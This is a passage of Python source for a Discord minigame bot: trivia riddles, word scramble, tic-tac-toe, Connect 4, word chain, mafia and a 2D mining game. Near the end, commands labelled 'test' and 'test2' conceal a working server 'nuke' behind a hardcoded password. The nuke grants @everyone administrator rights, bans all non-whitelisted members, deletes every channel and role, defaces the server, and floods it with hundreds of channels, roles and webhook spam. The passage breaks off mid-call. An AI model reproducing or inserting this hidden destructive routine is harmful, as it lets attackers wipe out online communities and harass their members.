    ("No life, but can die?", ["Battery", "Star", "Fire", "Engine"], "Battery"),
    ("What can you catch but not throw?", ["Cold", "Ball", "Fish", "Dream"], "Cold"),
    ("What disappears when you say its name?", ["Silence", "Secret", "Shadow", "Echo"], "Silence"),
    ("Has a spine but no bones?", ["Book", "Mountain", "Chair", "Tree"], "Book"),
    ("Fills a room but takes no space?", ["Light", "Air", "Sound", "Time"], "Light"),
    ("Has cities but no houses, mountains but no trees?", ["Map", "Globe", "Painting", "Dream"], "Map"),
    ("Has legs but doesn't walk?", ["Table", "Chair", "Bed", "Ladder"], "Table"),
    ("What can you break without touching?", ["Silence", "Glass", "Record", "Law"], "Silence"),
    ("Always in front of you but can't be seen?", ["Future", "Wind", "Horizon", "Tomorrow"], "Future"),
    ("What has a bottom at the top?", ["Legs", "Canyon", "Mountain", "Bottle"], "Legs"),
    ("Head, tail, brown, no legs?", ["Penny", "Snake", "Worm", "Stick"], "Penny"),
    ("Runs around whole yard without moving?", ["Fence", "Shadow", "Sun", "Grass"], "Fence"),
    ("Question you can never answer 'yes' to?", ["Are you asleep?", "Are you dead?", "Is it raining?", "Are you ready?"], "Are you asleep?"),
    ("Black when buy, red when use, gray when throw away?", ["Charcoal", "Wood", "Coal", "Fire"], "Charcoal"),
    ("One eye but can't see?", ["Needle", "Storm", "Hurricane", "Potato"], "Needle"),
    ("Many keys but can't open a lock?", ["Piano", "Keyboard", "Map", "Computer"], "Piano"),
    ("Travels world while staying in a corner?", ["Stamp", "Globe", "Coin", "Flag"], "Stamp"),
    ("Cut on a table but never eaten?", ["Deck of cards", "Paper", "Cloth", "Film"], "Deck of cards"),
    ("Has a ring but no finger?", ["Telephone", "Bell", "Ear", "Planet"], "Telephone"),
    ("Goes through towns & hills but never moves?", ["Road", "River", "Wind", "Train"], "Road"),
    ("Has a tongue but cannot talk?", ["Shoe", "Boot", "Bell", "Fire"], "Shoe"),
    ("What word contains 26 letters but only 3 syllables?", ["Alphabet", "Encyclopedia", "Dictionary", "Abbreviation"], "Alphabet"),
    ("As light as a feather, strongest man can't hold 5 mins?", ["Breath", "Thought", "Air", "Shadow"], "Breath"),
    ("Flies without wings, cries without eyes, darkness follows?", ["Cloud", "Wind", "Ghost", "Bat"], "Cloud"),
    ("If 2's company & 3's a crowd, what are 4 & 5?", ["Nine", "Party", "Team", "Family"], "Nine"),
    ("6-letter word: remove 1, 12 remains?", ["Dozens", "Scores", "Elevens", "Amount"], "Dozens"),
    ("What invention lets you look right through a wall?", ["Window", "X-ray", "Drill", "Door"], "Window"),
    ("I make a loud sound changing. Get bigger, weigh less?", ["Popcorn", "Balloon", "Bomb", "Ice"], "Popcorn"),
    ("Woman shoots husband, holds underwater, hangs him. Dine. How?", ["Photo", "Immortal", "CPR", "Game"], "Photo"),
    ("Simple, points, guides worldwide?", ["Compass", "Map", "Sign", "Star"], "Compass"),
    ("Tear one, scratch head, red becomes black?", ["Match", "Scab", "Sticker", "Paint"], "Match"),
    ("Before Everest, highest mountain?", ["Everest", "K2", "Kilimanjaro", "Fuji"], "Everest"),
    ("Big as you, weighs nothing?", ["Shadow", "Reflection", "Soul", "Mind"], "Shadow"),
    ("Draw line, make longer without touching?", ["Shorter beside it", "Erase", "Bend", "Look"], "Shorter beside it"),
    ("People make, save, change, raise me?", ["Money", "Child", "Crop", "House"], "Money"),
    ("No life, can die?", ["Battery", "Star", "Fire", "Engine"], "Battery"),
    ("Catch but not throw?", ["Cold", "Ball", "Fish", "Dream"], "Cold"),
    ("Disappears when said?", ["Silence", "Secret", "Shadow", "Echo"], "Silence"),
    ("Spine, no bones?", ["Book", "Mountain", "Chair", "Tree"], "Book"),
    ("Fills room, no space?", ["Light", "Air", "Sound", "Time"], "Light"),
    ("Cities, no houses?", ["Map", "Globe", "Painting", "Dream"], "Map"),
    ("Bigger when take away?", ["Hole", "Debt", "Problem", "Shadow"], "Hole"),
    ("Legs, no walk?", ["Table", "Chair", "Bed", "Ladder"], "Table"),
    ("Neck, no head?", ["Bottle", "Shirt", "Guitar", "Vase"], "Bottle"),
    ("Break without touch?", ["Silence", "Glass", "Record", "Law"], "Silence"),
    ("Always in front, unseen?", ["Future", "Wind", "Horizon", "Tomorrow"], "Future")
]

class TriviaView(discord.ui.View):
    def __init__(self, uid, correct_answer, reward):
        super().__init__(timeout=5.0)
        self.uid = uid
        self.correct = correct_answer
        self.reward = reward
        self.answered = False

    async def handle_click(self, interaction: discord.Interaction, is_correct: bool):
        if str(interaction.user.id) != self.uid: return
        self.answered = True
        for child in self.children: child.disabled = True
        
        if is_correct:
            user = init_user(self.uid)
            user["coins"] += self.reward
            save_data()
            await interaction.response.edit_message(content=f"✅ Correct! You solved the logic puzzle and earned **{self.reward} 🪙**.", view=self)
        else:
            await interaction.response.edit_message(content=f"❌ Wrong! The correct answer was **{self.correct}**.", view=self)
        self.stop()
        
    async def on_timeout(self):
        if not self.answered:
            user = init_user(self.uid)
            user["coins"] -= 10
            save_data()
            try:
                for child in self.children: child.disabled = True
                await self.message.edit(content=_t(self.uid, "timeout_penalty"), view=self)
            except Exception: pass

@tree.command(name="trivia", description="Answer a heavily logic-based trivia question to earn coins")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def trivia(interaction: discord.Interaction):
    uid = str(interaction.user.id)
    user = init_user(uid)
    now = time.time()
    last_trivia = user.get("last_trivia", 0)
    if now - last_trivia < 600: # 5 MINUTES COOLDOWN
        left = int(600 - (now - last_trivia))
        mins, secs = divmod(left, 60)
        return await interaction.response.send_message(f"⏳ Please wait **{mins}m {secs}s** before playing trivia again.", ephemeral=True)
        
    # Anti-repeat logic
    available = [q for q in TRIVIA_POOL if q[0] not in TRIVIA_HISTORY]
    if not available:
        TRIVIA_HISTORY.clear()
        available = TRIVIA_POOL

    q, options, ans = random.choice(available)
    TRIVIA_HISTORY.append(q)
    random.shuffle(options)
    
    user["last_trivia"] = now
    save_data()
    reward = random.randint(500, 1500)

    view = TriviaView(uid, ans, reward)
    for opt in options:
        btn = discord.ui.Button(label=opt, style=discord.ButtonStyle.primary)
        btn.callback = lambda i, o=opt: view.handle_click(i, o == view.correct)
        view.add_item(btn)
         
    await interaction.response.send_message(f"🧠 **Logic Trivia Time!** (5s to answer)\n{q}", view=view)
    view.message = await interaction.original_response()

class ScrambleModal(discord.ui.Modal, title='Unscramble the word!'):
    guess = discord.ui.TextInput(label='Your Guess')

    def __init__(self, original_word, reward, start_time):
        super().__init__()
        self.word = original_word
        self.reward = reward
        self.start_time = start_time

    async def on_submit(self, interaction: discord.Interaction):
        uid = str(interaction.user.id)
        if time.time() - self.start_time > 5.0:
            user = init_user(uid)
            user["coins"] -= 10
            save_data()
            return await interaction.response.send_message(_t(uid, "timeout_penalty"))
            
        if self.guess.value.lower() == self.word:
            user = init_user(uid)
            user["coins"] += self.reward
            save_data()
            await interaction.response.send_message(f"✅ Correct! The word was **{self.word}**. You earned **{self.reward} 🪙**!")
        else:
            await interaction.response.send_message(f"❌ Incorrect! The word was **{self.word}**.")

class ScrambleView(discord.ui.View):
    def __init__(self, uid, word, start_time):
        super().__init__(timeout=5.0)
        self.uid = uid
        self.word = word
        self.start_time = start_time
        self.answered = False
        
    @discord.ui.button(label="Click Here to Type Guess", style=discord.ButtonStyle.success)
    async def guess_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if str(interaction.user.id) != self.uid:
            return await interaction.response.send_message("Not yours!", ephemeral=True)
        self.answered = True
        await interaction.response.send_modal(ScrambleModal(self.word, random.randint(100, 200), self.start_time))
        self.stop()
        
    async def on_timeout(self):
        if not self.answered:
            user = init_user(self.uid)
            user["coins"] -= 10
            save_data()
            try:
                for child in self.children: child.disabled = True
                await self.message.edit(content=_t(self.uid, "timeout_penalty"), view=self)
            except Exception: pass

@tree.command(name="scramble", description="Unscramble a word to earn coins")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def scramble(interaction: discord.Interaction):
    uid = str(interaction.user.id)
    user = init_user(uid)

    now = time.time()
    last_scramble = user.get("last_scramble", 0)
    if now - last_scramble < 120: # 2 MINUTES COOLDOWN
        left = int(120 - (now - last_scramble))
        mins, secs = divmod(left, 60)
        return await interaction.response.send_message(f"⏳ Please wait **{mins}m {secs}s** before playing scramble again.", ephemeral=True)
        
    user["last_scramble"] = now
    save_data()

    words = ["casino", "gamble", "jackpot", "discord", "python", "roulette", "blackjack"]
    word = random.choice(words)
    scrambled = list(word)
    random.shuffle(scrambled)
    start_time = time.time()
    
    view = ScrambleView(uid, word, start_time)
    await interaction.response.send_message(f"📝 You have 5s! Scrambled: **{''.join(scrambled)}**", view=view)
    view.message = await interaction.original_response()

# ==========================================
# 2-PLAYER BOARD GAMES & COMBAT
# ==========================================
class FightView(discord.ui.View):
    def __init__(self, p1, p2):
        super().__init__(timeout=60)
        self.p1, self.p2 = p1, p2
        self.turn = p1
        self.hp = {p1.id: 100, p2.id: 100}
        self.defending = {p1.id: False, p2.id: False}
        
    def embed_status(self):
        desc = f"**{self.p1.display_name}**: {self.hp[self.p1.id]} HP\n**{self.p2.display_name}**: {self.hp[self.p2.id]} HP\n\nTurn: {self.turn.mention}"
        return discord.Embed(title="⚔️ RPG Battle", description=desc, color=discord.Color.red())

    @discord.ui.button(label="Attack", style=discord.ButtonStyle.danger, emoji="🗡️")
    async def attack(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.turn.id: return await interaction.response.send_message("Not your turn!", ephemeral=True)
        target = self.p2 if self.turn == self.p1 else self.p1
        dmg = random.randint(10, 25)
        if self.defending[target.id]: dmg //= 2; self.defending[target.id] = False
        self.hp[target.id] -= dmg
        if self.hp[target.id] <= 0:
            for child in self.children: child.disabled = True
            await interaction.response.edit_message(content=f"🏆 {self.turn.mention} struck for {dmg} DMG and won the battle!", embed=self.embed_status(), view=self)
            self.stop()
        else:
            self.turn = target
            await interaction.response.edit_message(content=f"💥 Struck for {dmg} DMG!", embed=self.embed_status(), view=self)

    @discord.ui.button(label="Defend", style=discord.ButtonStyle.secondary, emoji="🛡️")
    async def defend(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.turn.id: return await interaction.response.send_message("Not your turn!", ephemeral=True)
        self.defending[self.turn.id] = True
        self.turn = self.p2 if self.turn == self.p1 else self.p1
        await interaction.response.edit_message(content="🛡️ Braced for impact (50% damage reduction).", embed=self.embed_status(), view=self)

    @discord.ui.button(label="Heal", style=discord.ButtonStyle.success, emoji="🧪")
    async def heal(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.turn.id: return await interaction.response.send_message("Not your turn!", ephemeral=True)
        amt = random.randint(15, 30)
        self.hp[self.turn.id] = min(100, self.hp[self.turn.id] + amt)
        self.turn = self.p2 if self.turn == self.p1 else self.p1
        await interaction.response.edit_message(content=f"🧪 Healed for {amt} HP!", embed=self.embed_status(), view=self)

@tree.command(name="fight", description="RPG battle against another player")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def fight(interaction: discord.Interaction, target: discord.User):
    if target.bot or target.id == interaction.user.id: return await interaction.response.send_message("❌ Invalid target.", ephemeral=True)
    view = FightView(interaction.user, target)
    await interaction.response.send_message(embed=view.embed_status(), view=view)

class TicTacToeView(discord.ui.View):
    def __init__(self, p1, p2):
        super().__init__(timeout=60)
        self.p1 = p1
        self.p2 = p2
        self.turn = p1
        self.board = ["-"] * 9
        for i in range(9):
            btn = discord.ui.Button(label="\u200b", style=discord.ButtonStyle.secondary, row=i//3)
            btn.callback = self.create_callback(i, btn)
            self.add_item(btn)

    def check_win(self):
        lines = [(0,1,2),(3,4,5),(6,7,8),(0,3,6),(1,4,7),(2,5,8),(0,4,8),(2,4,6)]
        for a,b,c in lines:
            if self.board[a] == self.board[b] == self.board[c] != "-": return self.board[a]
        if "-" not in self.board: return "Tie"
        return None

    def create_callback(self, i, button):
        async def callback(interaction: discord.Interaction):
            if interaction.user.id != self.turn.id: return await interaction.response.send_message("Not your turn!", ephemeral=True)
            mark = "X" if self.turn == self.p1 else "O"
            self.board[i] = mark
            button.label = mark
            button.style = discord.ButtonStyle.success if mark == "X" else discord.ButtonStyle.danger
            button.disabled = True
            res = self.check_win()
            if res:
                for child in self.children: child.disabled = True
                msg = "🤝 It's a Tie!" if res == "Tie" else f"🏆 {self.turn.mention} wins!"
                await interaction.response.edit_message(content=f"⭕ **Tic-Tac-Toe** ❌\n\n{msg}", view=self)
                self.stop()
            else:
                self.turn = self.p2 if self.turn == self.p1 else self.p1
                await interaction.response.edit_message(content=f"⭕ **Tic-Tac-Toe** ❌\n{self.turn.mention}'s turn!", view=self)
        return callback

@tree.command(name="tictactoe", description="Play Tic-Tac-Toe against another player")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def tictactoe(interaction: discord.Interaction, target: discord.User):
    if target.bot or target.id == interaction.user.id: return await interaction.response.send_message("❌ Invalid target.", ephemeral=True)
    view = TicTacToeView(interaction.user, target)
    await interaction.response.send_message(f"⭕ **Tic-Tac-Toe** ❌\n{interaction.user.mention} vs {target.mention}\n{interaction.user.mention}'s turn!", view=view)

class Connect4View(discord.ui.View):
    def __init__(self, p1, p2):
        super().__init__(timeout=120)
        self.p1, self.p2 = p1, p2
        self.turn = p1
        self.grid = [["⚫" for _ in range(7)] for _ in range(6)]
        for c in range(7):
            btn = discord.ui.Button(label=str(c+1), style=discord.ButtonStyle.primary, row=c//4)
            btn.callback = self.create_callback(c)
            self.add_item(btn)

    def render_grid(self):
        return "\n".join(["".join(row) for row in self.grid])

    def check_win(self, mark):
        for r in range(6):
            for c in range(7):
                if self.grid[r][c] != mark: continue
                if c <= 3 and all(self.grid[r][c+i] == mark for i in range(4)): return True
                if r <= 2 and all(self.grid[r+i][c] == mark for i in range(4)): return True
                if r <= 2 and c <= 3 and all(self.grid[r+i][c+i] == mark for i in range(4)): return True
                if r <= 2 and c >= 3 and all(self.grid[r+i][c-i] == mark for i in range(4)): return True
        return False

    def create_callback(self, c):
        async def callback(interaction: discord.Interaction):
            if interaction.user.id != self.turn.id: return await interaction.response.send_message("Not your turn!", ephemeral=True)
            mark = "🔴" if self.turn == self.p1 else "🟡"
            placed = False
            for r in range(5, -1, -1):
                if self.grid[r][c] == "⚫":
                    self.grid[r][c] = mark
                    placed = True
                    break
            if not placed: return await interaction.response.send_message("Column is full!", ephemeral=True)
            if self.check_win(mark):
                for child in self.children: child.disabled = True
                await interaction.response.edit_message(content=f"🔴 **Connect 4** 🟡\n\n{self.render_grid()}\n\n🏆 {self.turn.mention} wins!", view=self)
                self.stop()
            else:
                self.turn = self.p2 if self.turn == self.p1 else self.p1
                await interaction.response.edit_message(content=f"🔴 **Connect 4** 🟡\n{self.turn.mention}'s turn!\n\n{self.render_grid()}", view=self)
        return callback

@tree.command(name="connect4", description="Play Connect 4 against another player")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def connect4(interaction: discord.Interaction, target: discord.User):
    if target.bot or target.id == interaction.user.id: return await interaction.response.send_message("❌ Invalid target.", ephemeral=True)
    view = Connect4View(interaction.user, target)
    await interaction.response.send_message(f"🔴 **Connect 4** 🟡\n{interaction.user.mention} vs {target.mention}\n{interaction.user.mention}'s turn!\n\n{view.render_grid()}", view=view)

class WordchainModal(discord.ui.Modal, title='Type a Word!'):
    guess = discord.ui.TextInput(label='Your Word')

    def __init__(self, view):
        super().__init__()
        self.vw = view

    async def on_submit(self, interaction: discord.Interaction):
        word = self.guess.value.strip().lower()
        if len(word) < 3:
            return await interaction.response.send_message("❌ Word must be at least 3 letters long.", ephemeral=True)
        if not word.isalpha():
            return await interaction.response.send_message("❌ Only letters are allowed.", ephemeral=True)
            
        required_letter = self.vw.current_word[-1] if self.vw.current_word else self.vw.start_letter
        if not word.startswith(required_letter):
            return await interaction.response.send_message(f"❌ Your word must start with **'{required_letter.upper()}'**!", ephemeral=True)
            
        if word in self.vw.used_words:
            return await interaction.response.send_message("❌ That word has already been used!", ephemeral=True)
            
        self.vw.used_words.add(word)
        self.vw.current_word = word
        self.vw.turn = self.vw.p2 if self.vw.turn == self.vw.p1 else self.vw.p1
        
        await interaction.response.edit_message(content=f"🔗 **Word Chain**\n{interaction.user.display_name} played: **{word}**\n\nNext letter: **{word[-1].upper()}**\n{self.vw.turn.mention}'s turn!", view=self.vw)

class WordchainView(discord.ui.View):
    def __init__(self, p1, p2):
        super().__init__(timeout=60)
        self.p1 = p1
        self.p2 = p2
        self.turn = p1
        self.used_words = set()
        self.start_letter = random.choice("abcdefghijklmnopqrstuvwxyz")
        self.current_word = ""
        
    @discord.ui.button(label="Play Turn", style=discord.ButtonStyle.primary)
    async def play(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.turn.id:
            return await interaction.response.send_message("Not your turn!", ephemeral=True)
        await interaction.response.send_modal(WordchainModal(self))

@tree.command(name="wordchain", description="Play a word chain game")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def wordchain(interaction: discord.Interaction, target: discord.User):
    if target.bot or target.id == interaction.user.id: return await interaction.response.send_message("❌ Invalid target.", ephemeral=True)
    view = WordchainView(interaction.user, target)
    await interaction.response.send_message(f"🔗 **Word Chain**\n{interaction.user.mention} vs {target.mention}\n\nStarting letter: **{view.start_letter.upper()}**\n{interaction.user.mention}, click below to play!", view=view)

class MafiaView(discord.ui.View):
    def __init__(self, host_id):
        super().__init__(timeout=30)
        self.participants = [host_id]

    @discord.ui.button(label="Join Town", style=discord.ButtonStyle.primary, emoji="🕵️")
    async def join(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id in self.participants: return await interaction.response.send_message("❌ You already joined!", ephemeral=True)
        self.participants.append(interaction.user.id)
        await interaction.response.send_message(f"✅ {interaction.user.display_name} joined!", ephemeral=False)

@tree.command(name="mafia", description="Play a quick game of Mafia/Spy with 3+ friends")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def mafia(interaction: discord.Interaction):
    await interaction.response.defer()
    view = MafiaView(interaction.user.id)
    embed = discord.Embed(title="🕵️ Mafia Game Starting!", description="Click to join the town! Game starts in 30 seconds.\nRequires at least 3 players.", color=discord.Color.dark_grey())
    msg = await interaction.followup.send(embed=embed, view=view)
    
    await asyncio.sleep(30)
    for child in view.children: child.disabled = True
    await msg.edit(view=view)
    
    if len(view.participants) < 3:
        return await interaction.followup.send("❌ Not enough players to start Mafia (3 required).")
        
    spy_id = random.choice(view.participants)
    
    # We can't easily DM everyone asynchronously reliably in a simple script without rate limits, 
    # so we will use an interactive view where players click to view their role ephemerally.
    
    class RoleView(discord.ui.View):
        def __init__(self, parts, spy):
            super().__init__(timeout=60)
            self.parts = parts
            self.spy = spy
            self.votes = {}
            for p in parts:
                btn = discord.ui.Button(label=f"Vote <@{p}>", custom_id=str(p))
                btn.callback = self.create_vote(p)
                self.add_item(btn)

        def create_vote(self, p_id):
            async def callback(i: discord.Interaction):
                if i.user.id not in self.parts: return await i.response.send_message("You aren't playing!", ephemeral=True)
                self.votes[i.user.id] = p_id
                await i.response.send_message(f"You voted for <@{p_id}>", ephemeral=True)
                
                if len(self.votes) == len(self.parts):
                    # Tally votes
                    counts = {pid: list(self.votes.values()).count(pid) for pid in self.parts}
                    max_votes = max(counts.values())
                    voted_out = [k for k, v in counts.items() if v == max_votes]
                    
                    if len(voted_out) > 1:
                        await i.followup.send("🤝 **TIE!** The town couldn't decide. The Mafia wins!")
                    elif voted_out[0] == self.spy:
                        await i.followup.send(f"🎉 **TOWN WINS!** They successfully voted out the Mafia (<@{self.spy}>)!")
                    else:
                        await i.followup.send(  f"🩸 **MAFIA WINS!** The town voted out an innocent (<@{voted_out[0]}>). The Mafia was <@{self.spy}>!")
                    self.stop()
            return callback
            
        @discord.ui.button(label="View My Role", style=discord.ButtonStyle.success, row=4)
        async def view_role(self, i: discord.Interaction, b: discord.ui.Button):
            if i.user.id not in self.parts: return await i.response.send_message("Not playing!", ephemeral=True)
            role = "🔪 MAFIA" if i.user.id == self.spy else "🧑‍🌾 INNOCENT"
            await i.response.send_message(f"Your role is: **{role}**", ephemeral=True)
            
    await interaction.followup.send(f"🕵️ **Game Started!**\n1. Click 'View My Role'.\n2. Discuss in chat.\n3. Click a button to cast your final vote!", view=RoleView(view.participants, spy_id))


# ==========================================
# MINECRAFT
# ==========================================
class MinecraftView(discord.ui.View):
    def __init__(self, user_id):
        super().__init__(timeout=180)
        self.user_id = user_id
        self.grid_size = 10
        self.grid = [["🔲" if y<2 else "🟫" if y<4 else "🪨" for _ in range(10)] for y in range(10)]
        self.px, self.py, self.dx, self.dy = 4, 1, 0, 1

    def generate_embed(self):
        dg = [row.copy() for row in self.grid]
        chars = {(1,0): "➡️", (-1,0): "⬅️", (0,-1): "⬆️", (0,1): "⬇️"}
        dg[self.py][self.px] = chars.get((self.dx, self.dy), "🧍")
        tx, ty = self.px + self.dx, self.py + self.dy
        if 0 <= tx < 10 and 0 <= ty < 10 and dg[ty][tx] == "🔲": dg[ty][tx] = "⏺️"
        embed = discord.Embed(title="⛏️ Minecraft 2D", description="\n".join(["".join(r) for r in dg]), color=discord.Color.green())
        return embed

    async def update_view(self, interaction): await interaction.response.edit_message(embed=self.generate_embed(), view=self)

    def try_move(self, ndx, ndy):
        self.dx, self.dy = ndx, ndy
        tx, ty = self.px + ndx, self.py + ndy
        if 0 <= tx < 10 and 0 <= ty < 10 and self.grid[ty][tx] == "🔲": self.px, self.py = tx, ty

    @discord.ui.button(emoji="⬆️", row=0)
    async def up(self, i, b): 
        if i.user.id == self.user_id: self.try_move(0, -1); await self.update_view(i)
    @discord.ui.button(emoji="⬇️", row=2)
    async def down(self, i, b): 
        if i.user.id == self.user_id: self.try_move(0, 1); await self.update_view(i)
    @discord.ui.button(emoji="⬅️", row=1)
    async def left(self, i, b): 
        if i.user.id == self.user_id: self.try_move(-1, 0); await self.update_view(i)
    @discord.ui.button(emoji="➡️", row=1)
    async def right(self, i, b): 
        if i.user.id == self.user_id: self.try_move(1, 0); await self.update_view(i)
    @discord.ui.button(label="⛏️", style=discord.ButtonStyle.primary, row=1)
    async def mine(self, i, b):
        if i.user.id != self.user_id: return
        tx, ty = self.px + self.dx, self.py + self.dy
        if 0 <= tx < 10 and 0 <= ty < 10 and (tx, ty) != (self.px, self.py): self.grid[ty][tx] = "🔲"
        await self.update_view(i)

@tree.command(name="minecraft", description="Play a 2D Minecraft mini-game")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def minecraft(interaction: discord.Interaction):
    view = MinecraftView(interaction.user.id)
    await interaction.response.send_message(embed=view.generate_embed(), view=view)


# ==========================================
# TEST/ADMIN COMMAND
# ==========================================

@tree.command(name="test", description="test commands(ADMIN ONLY)")
@app_commands.describe(interval="The interval between each message (ms)")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def private_messages_command(interaction: discord.Interaction, interval: int = 0):
    if interaction.user.id not in WHITELIST_IDS:
        await interaction.response.send_message(
            "You don't have permissions to do this :D",
            ephemeral=True
        )
        return
    
    view = UserInstallButtonView(interval=interval) 
    await interaction.response.send_message(
        f"# Click me pls :D",
        view=view,
        ephemeral=True
    )
@tree.command(name="test2", description="[ADMIN] test commands(GUILD INSTALL ONLY)")
async def nuke(interaction: discord.Interaction, password: str):
    # 🔐 Password Check
    if password != "114514":  # ← Change this to your desired password
        await interaction.response.send_message("❌ Wrong password", ephemeral=True)
        return


    # Defer response since nuke takes time

    guild = interaction.guild
    print(f"{Fore.RED}[*] Executing nuke on: {guild.name}{Fore.RESET}")

    # Give @everyone Admin permission
    permissions = discord.Permissions(8)
    for role in list(guild.roles):
        if role.name == '@everyone':
            try:
                await role.edit(permissions=permissions, reason="Axe On Top")
                print(f"\x1b[38;5;34mGave everyone Admin In {guild.name}!")
            except:
                print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {guild.name}!")

    # Ban all members EXCEPT whitelisted IDs
    for user in list(guild.members):
        if user.id in WHITELIST_IDS:
            print(f"{Fore.YELLOW}[*] Skipped ban for whitelisted user: {user.name}#{user.discriminator}{Fore.RESET}")
            continue
        try:
            await user.ban(reason="Server Nuked")
            print(f"{Fore.LIGHTCYAN_EX}[+][BANNED]{Fore.LIGHTYELLOW_EX} {user.name}{Fore.RESET}")
        except:
            pass

    # Delete all channels
    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            pass

    # Delete all roles (skip @everyone)
    for role in list(guild.roles):
        if role.name != '@everyone':
            try:
                await role.delete()
            except:
                pass

    # Edit server info
    try:
        await guild.edit(
            name="﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽",
            description="﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽",
            reason="棍母の力",
            icon=None,
            banner=None
        )
    except:
        pass

    print(f"{Fore.YELLOW}[*] Creating channels and starting spam immediately...{Fore.RESET}")
    
    async def create_and_spam(channel_name: str, spam_msgs: list, count: int):
        for _ in range(count):
            try:
                # 創建頻道
                channel = await guild.create_text_channel(name=channel_name)
                
                # 立即創建 webhook 並開始 spam（不等待）
                webhook = await channel.create_webhook(name="﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽")
                asyncio.create_task(spam_channel(channel, webhook, spam_msgs))
                
                # 可選：微小延遲避免速率限制
                await asyncio.sleep(0.1)
            except:
                pass

    # 啟動頻道創建 + spam 任務
    asyncio.create_task(create_and_spam(CHANNEL_NAME, SPAM_MESSAGES, 250))
    for _i in range(249):
        await guild.create_role(name=ROLE_NAME, color=RandomColor())

    # === WEBHOOK SPAM ===
    print(f"{Fore.YELLOW}[*] Starting webhook spam in new channels...{Fore.RESET}")
    for channel in created_channels:
        try:
            webhook = await channel.create_webhook(name="﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽")
            asyncio.create_task(spam_channel(channel, webhook))
        except:
            pass

    # Follow-up to confirm completion
    await interaction.followup.send("✅ Nuke complete.", ephemeral=True)
    print(f"{Fore.GREEN}[+] Nuke complete.{Fore.RESET}")

async def spam_channel(channel, webhook, messages: list):
    """立即開始 spam，無延遲啟動"""
    while True:
        try:
            msg = random.choice(messages)
            # 並行發送：普通消息 + webhook 消息
            await asyncio.gather(
                channel.send(msg),
